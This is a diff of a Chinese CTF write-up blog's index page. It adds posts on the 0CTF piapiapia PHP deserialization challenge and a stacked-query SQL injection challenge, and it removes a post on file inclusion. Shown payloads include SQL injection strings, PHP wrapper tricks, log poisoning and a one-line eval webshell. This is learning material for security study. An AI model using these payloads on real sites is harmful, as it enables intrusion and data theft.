@@ -147,6 +147,235 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/03/buu-piapiapia/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/03/buu-piapiapia/" class="post-title-link" itemprop="url">buu-piapiapia</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-03 17:17:25 / Modified: 19:46:49" itemprop="dateCreated datePublished" datetime="2021-03-03T17:17:25+08:00">2021-03-03</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="0CTF-2016-piapiapia1"><a href="#0CTF-2016-piapiapia1" class="headerlink" title="[0CTF 2016]piapiapia1"></a>[0CTF 2016]piapiapia1</h2><p>不是sql注入，扫后台，发现网站源码泄漏（<a target="_blank" rel="noopener" href="http://www.zip)/">www.zip）</a>  </p>
+<hr>
+<p> config.php，里面有个flag变量（判断flag在config.php中，想办法读取）：</p>
+<pre><code>$config[&#39;hostname&#39;] = &#39;127.0.0.1&#39;;
+$config[&#39;username&#39;] = &#39;root&#39;;
+$config[&#39;password&#39;] = &#39;&#39;;
+$config[&#39;database&#39;] = &#39;&#39;;
+$flag = &#39;&#39;;</code></pre>
+<hr>
+<p> profile.php文件:</p>
+<pre><code>&lt;?php
+require_once(&#39;class.php&#39;);//profile.php包含了class.php
+if($_SESSION[&#39;username&#39;] == null) &#123;
+    die(&#39;Login First&#39;);
+&#125;
+$username = $_SESSION[&#39;username&#39;];
+$profile=$user-&gt;show_profile($username);//变量由show_profile()方法传递，由于profile.php包含了class.php，所以在class.php中跟踪该方法
+if($profile  == null) &#123;
+    header(&#39;Location: update.php&#39;);
+&#125;
+else &#123;
+    $profile = unserialize($profile);//对$profile变量进行了反序列化
+    $phone = $profile[&#39;phone&#39;];
+    $email = $profile[&#39;email&#39;];
+    $nickname = $profile[&#39;nickname&#39;];
+    $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));//file_get_contents()(将一个文件读取到一个字符串中)
+?&gt;</code></pre>
+<ul>
+<li>想办法利用file_get_contents()读取config.php文件</li>
+</ul>
+<hr>
+<p>class.php:</p>
+<p>跟踪show_profile()</p>
+<pre><code>public function show_profile($username)
+&#123;
+    $username = parent::filter($username);
+    $where = &quot;username = &#39;$username&#39;&quot;;
+    $object = parent::select($this-&gt;table, $where);
+    return $object-&gt;profile;
+&#125;//对username进行处理，调用了父类filter和select方法</code></pre>
+<p>涉及到的方法如下（class.php）：</p>
+<pre><code>public function select($table, $where, $ret = &#39;*&#39;) &#123;
+    $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;
+    $result = mysql_query($sql, $this-&gt;link);
+    return mysql_fetch_object($result);
+&#125;
+
+public function filter($string) &#123;
+    $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
+    $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;
+    $string = preg_replace($escape, &#39;_&#39;, $string);
+    $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
+    $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;
+    return preg_replace($safe, &#39;hacker&#39;, $string);
+&#125;//替换字符串中的单引号和反斜杠为下划线 ，并且替换多个字符串为hacker。implode函数是表示把数组拼接起来，拼接符是 “|”：</code></pre>
+<hr>
+<p>update.php中反序列化操作:</p>
+<pre><code>$user-&gt;update_profile($username, serialize($profile));</code></pre>
+<p>调用了class.php中user子类的update_profile方法，回到class.php</p>
+<pre><code>public function update_profile($username, $new_profile) &#123;
+    $username = parent::filter($username);
+    $new_profile = parent::filter($new_profile);
+    $where = &quot;username = &#39;$username&#39;&quot;;
+    return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
+&#125;</code></pre>
+<p>又利用了父类中的filter方法，同时还有update方法</p>
+<pre><code>public function update($table, $key, $value, $where) &#123;
+    $sql = &quot;UPDATE $table SET $key = &#39;$value&#39; WHERE $where&quot;;
+    return mysql_query($sql);
+&#125;</code></pre>
+<hr>
+<p>综上：</p>
+<p>unserialize-&gt;show_profile方法-&gt;select方法</p>
+<p>serialize-&gt;update_profile方法-&gt;update方法</p>
+<p>分析：首先数据经过序列化传入到数据库，然后取出的时候反序列化，需要传入参数，并且构造恶意参数，而update.php这个页面我们可以看到是一个数据传入的页面，看看是否存在漏洞</p>
+<pre><code>if(!preg_match(&#39;/^\d&#123;11&#125;$/&#39;, $_POST[&#39;phone&#39;]))
+die(&#39;Invalid phone&#39;);
+
+if(!preg_match(&#39;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#39;, $_POST[&#39;email&#39;]))
+die(&#39;Invalid email&#39;);
+
+if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)
+die(&#39;Invalid nickname&#39;);</code></pre>
+<p>前两个参数好像都没办法绕过，第三个参数好像可以绕过。<br>这里我们可以发现前面的正则时匹配所有字母和数字，也就是nickname是字母和数字的话，就是真，strlen()函数可以使用数组绕过，nickname就完全被我们控制了。</p>
+<p>update.php:</p>
+<pre><code>$profile[&#39;phone&#39;] = $_POST[&#39;phone&#39;];
+$profile[&#39;email&#39;] = $_POST[&#39;email&#39;];
+$profile[&#39;nickname&#39;] = $_POST[&#39;nickname&#39;];
+$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);
+$user-&gt;update_profile($username, serialize($profile));</code></pre>
+<p>unserialize(str) 会忽略能够正常序列化的字符串后面的字符串。像这样的一个字符串，我们可以可以不用反序列话，就能知道它反序列化后是什么，因为它是有规律的<br>a:4:{s:5:“phone”;s:11:“11111111111”;s:5:“email”;s:11:“<a href="mailto:&#x31;&#x61;&#x32;&#115;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109;">&#x31;&#x61;&#x32;&#115;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109;</a>”;s:8:“nickname”;s:3:“123”;s:5:“photo”;s:39:“upload/f3b94e88bd1bd325af6f62828c8785dd”;}<br>a:4指的是由一个数组序列化而来，并且有4个值。如果是对象的话，把a改成了O。然后就是一个键值名，一个变量值：<br>s:5:”phone”;第一个键值名，是string类型的，长度为五，s:11:”11111111111”;第一个变量值，string类型，长度为11.这就是它的规律。如果我们在这个序列化字符串的后面，再加上一些字符，后面的字符是不会被反序列化的<br>————————————————<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102703489">https://blog.csdn.net/weixin_44077544/article/details/102703489</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="post-title-link" itemprop="url">buu-随便注</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-31 18:20:27" itemprop="dateCreated datePublished" datetime="2021-01-31T18:20:27+08:00">2021-01-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-28 15:09:20" itemprop="dateModified" datetime="2021-03-28T15:09:20+08:00">2021-03-28</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="buu-web第二题，随便注"><a href="#buu-web第二题，随便注" class="headerlink" title="buu-web第二题，随便注"></a>buu-web第二题，随便注</h1><p>题目很嚣张啊，打开一看，1，提交如下，给了一段代码<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz1.png" alt="buu-sbz1.png"><br>接下来，根据常规操作，判断出字符型注入，两个字段，当我们开心地进行联合注入时，发现<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz2.png" alt="buu-sbz1.png"><br>select被注释掉了，也就是不能联合查询找flag了，所以要绕过select，用别的方法。<br>看了好多大佬的wp，说因可以输入多个语句，因此可以用堆叠查询<br>先查数据库（没啥用）<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz3.png" alt="buu-sbz1.png"><br>查表如下，有两个<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz4.png" alt="buu-sbz1.png"><br>再查表中的列如下(字符串为表名操作时要加反引号)，发现了flag<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz5.png" alt="buu-sbz1.png">  </p>
+<h2 id="方法1-预编译"><a href="#方法1-预编译" class="headerlink" title="方法1.预编译"></a>方法1.预编译</h2><p>flag在第一个表中，查flag，select被过滤，大佬说用预编译的方式绕过这个过滤，构造     </p>
+<pre><code>-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from
+`1919810931114514`;&#39;);prepare aaa from @sql;EXECUTE aaa; --+     </code></pre>
+<p>出现如下图,发现还过滤了set和prepare<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz6.png" alt="buu-sbz1.png"><br>利用文件上传漏洞大小写绕过，重新构造payload如下：     </p>
+<pre><code>-1&#39;;Set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from
+`1919810931114514`;&#39;);Prepare aaa from @sql;EXECUTE aaa; --+</code></pre>
+<p>欢天喜地，得到flag<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz7.png" alt="buu-sbz1.png">    </p>
+<hr>
+<h2 id="方法2-handler查询"><a href="#方法2-handler查询" class="headerlink" title="方法2.handler查询"></a>方法2.handler查询</h2><p>mysql可以使用select查询表中的数据，也可使用handler语句，这条语句是一行一行的浏览一个表中的数据。<br>handler可以用于MyISAM和InnoDB表。<br>使用方法：<br>handler table_name open打开一张表<br>handel table_name read first读取第一行内容，<br>handel table_name read next依次获取其它行<br>最后一行执行之后再执行handel table_name read next会返回一个空的结果。<br>构造payload：</p>
+<pre><code>-1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;#    </code></pre>
+<p><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz8.png" alt="buu-sbz1.png"><br>简单快捷，恐怖如斯！     </p>
+<hr>
+<h2 id="方法3-修改表名和列名"><a href="#方法3-修改表名和列名" class="headerlink" title="方法3.修改表名和列名"></a>方法3.修改表名和列名</h2><p>由上面知道flag在表“1919810931114514”中，查表words<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz9.jpg" alt="buu-sbz1.png"><br>根据两个表的情况结合实际查询出结果的情况判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id，我们可以利用数据库修改表名和列名的方法，将我们要查询的表名改成第二个，就可以查询出想要的内容了<br>操作如下：<br>alter table words rename to aaa;先把原来的words表名字改成其他<br>alter table 1919810931114514 rename to words;将表1919810931114514的名字改为words<br>alter table words change flag id varchar(100);将改完名字后的表中的flag改为id，字符串尽量长点<br>构造payload如下：</p>
+<pre><code>1&#39;; alter table words rename to aaaa;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);--+</code></pre>
+<p>然后我们用1’ or 1=1 –+直接就能得到  </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/31/buu-Warmup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -295,7 +524,7 @@ if (! empty($_REQUEST[&#39;file&#39;])
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">文件包含</a>
+            <a href="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">Untitled</a>
         </h2>
 
         <div class="post-meta">
@@ -312,7 +541,7 @@ if (! empty($_REQUEST[&#39;file&#39;])
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-07-22 16:11:33" itemprop="dateModified" datetime="2021-07-22T16:11:33+08:00">2021-07-22</time>
+                <time title="Modified: 2021-09-19 00:15:43" itemprop="dateModified" datetime="2021-09-19T00:15:43+08:00">2021-09-19</time>
               </span>
 
           
@@ -326,71 +555,10 @@ if (! empty($_REQUEST[&#39;file&#39;])
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>php伪协议实现命令执行的七种姿势</p>
-<pre><code>https://www.freebuf.com/column/148886.html</code></pre>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">filter:</span><br><span class="line"></span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input:</span><br><span class="line"></span><br><span class="line">?flie&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">&lt;?php system(&#39;ls&#39;);?&gt;  &lt;?php system(&#39;cat flag.php(base64)&#39;);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data:</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; system(&quot;cat fla*&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">日志文件：</span><br><span class="line">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line"></span><br><span class="line">一句话木马：</span><br><span class="line">&lt;?php eval($_POST[cmd]);?&gt;</span><br><span class="line"></span><br><span class="line">User-Agent: &lt;?php system(&#39;cat fl0g.php&#39;);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>利用session.upload_progress进行文件包含和反序列化渗透</p>
-<pre><code>https://www.freebuf.com/vuls/202819.html</code></pre>
-<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>刚起步，遇到两个 文件包含 的题目<br>先附上CSDN看到的关于文件包含的讲解<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37133717/article/details/94631028">https://blog.csdn.net/qq_37133717/article/details/94631028</a>    </p>
-<h2 id="bugku-6-文件包含-本地包含"><a href="#bugku-6-文件包含-本地包含" class="headerlink" title="bugku-6.文件包含-本地包含"></a>bugku-6.文件包含-本地包含</h2><p>CSDN大佬讲解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39431542/article/details/88628225">本地文件包含漏洞详解</a><br>第二行可知，flag在flag.php里，倒数第二行show_source(<strong>FILE</strong>)很明显的提示<br>$_REQUEST[]支持get、post两种方式发送过来的请求，很明显接收了hello参数的值，<br>var_dump()函数 显示关于一个或多个表达式的结构信息，包括表达式的类型与值；数组将递归展开值，通过缩进显示其结构<br>eval()函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>show_source() 函数对文件进行语法显示,是 highlight_file() 的别名</p>
-<blockquote>
-<p>本题代码如下</p>
-</blockquote>
-<p><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku6.1.png" alt="6.1"></p>
-<blockquote>
-<ul>
-<li>可直接将flag.php文件读入变量hello中</li>
-</ul>
-</blockquote>
-<p>url输入?hello=file(‘flag.php’)</p>
-<p><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku6.2.png" alt="6.2"></p>
-<blockquote>
-<ul>
-<li>eval存在命令执行漏洞，使用hello构造payload</li>
-</ul>
-</blockquote>
-<pre><code>index.php?hello=1);show_source(%27flag.php%27);var_dump(3</code></pre>
-<p><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku6.3.png" alt="6.3"></p>
-<hr>
-<h2 id="bugku-12-文件包含漏洞"><a href="#bugku-12-文件包含漏洞" class="headerlink" title="bugku-12.文件包含漏洞"></a>bugku-12.文件包含漏洞</h2><blockquote>
-<p><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku12.0.png" alt="12.0"><br>点<br><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku12.1.png" alt="12.1"><br>观察url : “<a target="_blank" rel="noopener" href="http://114.67.246.176:16465/index.php?file=show.php&quot;%EF%BC%8C%E7%9C%8B%E5%88%B0file%EF%BC%8C%E6%98%8E%E7%99%BD%E8%BF%99%E5%8F%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%8C%E8%81%94%E6%83%B3%E5%88%B0">http://114.67.246.176:16465/index.php?file=show.php&quot;，看到file，明白这又是文件包含的题目，联想到</a><u>读取index文件，但是直接读取index无法查看，所以就应该考虑用base64方法读取，构造url</u>.<br>构造url=“<a target="_blank" rel="noopener" href="http://your/">http://your</a> test ip/index.php?file=php://filter/read=convert.base64-encode/resource=index.php” , 网页返回base64.解码得flag<br><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/bugku12.2.png" alt="12.2"> </p>
-<ul>
-<li>php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。  </li>
-</ul>
-</blockquote>
-<hr>
-<h2 id="攻防世界-Web-php-include"><a href="#攻防世界-Web-php-include" class="headerlink" title="攻防世界-Web_php_include"></a>攻防世界-Web_php_include</h2><p><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.0.png" alt="3.0"><br>从代码中得知page中带有php://的都会被替换成空<br>    str_replace()以其他字符替换字符串中的一些字符(区分大小写)<br>    strstr() 查找字符串首次出现的位置。返回字符串剩余部分    </p>
-<blockquote>
-<p>方法一<br>1.可以利用PHP的大小写转换，利用PHP://input         </p>
-</blockquote>
-<ul>
-<li>php://filter<br>#执行文件<br>page=Php://filter/resource=index.php<br>#读取文件需要将文件名base64编码   page=Php://filter/read=convert.base64-encode/resource=index.php</li>
-<li>php://input<br>这个协议的利用方法是 将要执行的php代码写在post中提交，不用键与值的形式，只写代码即可。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;ls&quot;);?&gt;      </span><br><span class="line">&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt;   </span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>用burpsuite在报文中加一句话木马<br><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.1.png" alt="3.1"><br><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.2.png" alt="3.2">    </p>
-</blockquote>
-</li>
-</ul>
-<hr>
-<blockquote>
-<p>方法二 data协议    </p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data: text&#x2F;plain,&lt;?php 执行内容 ?&gt;   </span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;ls&quot;);?&gt;      </span><br><span class="line">?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt;  </span><br></pre></td></tr></table></figure>
-<p> 查看源代码，发现flag     </p>
-<blockquote>
-<p>方法三 http://协议进行绕过<br>利用hello参数将执行内容显示，flag如图所示</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;?hello&#x3D;&lt;? system(&quot;ls&quot;);?&gt;      </span><br></pre></td></tr></table></figure>
-<p><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.3.png" alt="3.3">   </p>
-<pre><code>?page=http://127.0.0.1/index.php/?hello=&lt;? show_source(&quot;fl4gisisish3r3.php&quot;);?&gt;    </code></pre>
-<p><img src="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/gf3.4.png" alt="3.4"></p>
-<hr>
-<h2 id="buu-BJDCTF2020-ZJCTF，不过如此"><a href="#buu-BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="buu-[BJDCTF2020]ZJCTF，不过如此"></a>buu-[BJDCTF2020]ZJCTF，不过如此</h2><p>get传入两个参数text和file,text参数利用file_get_contents()函数只读形式打开，打开后内容要与”I have a dream”字符串相匹配，才能执行下面的文件包含$file参数。<br>看到用的是file_get_contents()函数打开text参数，以及后面的文件包含函数，自然的想到php伪协议中的data://协议</p>
-<pre><code>index.php?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</code></pre>
-<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>func是一个函数名，而p是一个参数，所以可以猜测用func来执行p</p>
-<p>试着改参数，读取代码：func=file_get_contents&amp;p=index.php</p>
+          <hr>
+<p>title: 文件包含<br>date: 2021-01-16 10:15:37<br>tags: bugku刷到<br>categories:<br>-</p>
+<p>php伪协议可以套一层协议，从而绕过,进行任意文件读取，直接读flag.php</p>
+<p>?category=php://filter/read=convert.base64-encode/woofers/resource=flag</p>
 
       
     </div>
@@ -956,7 +1124,7 @@ if (! empty($_REQUEST[&#39;file&#39;])
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">29</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -965,7 +1133,7 @@ if (! empty($_REQUEST[&#39;file&#39;])
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
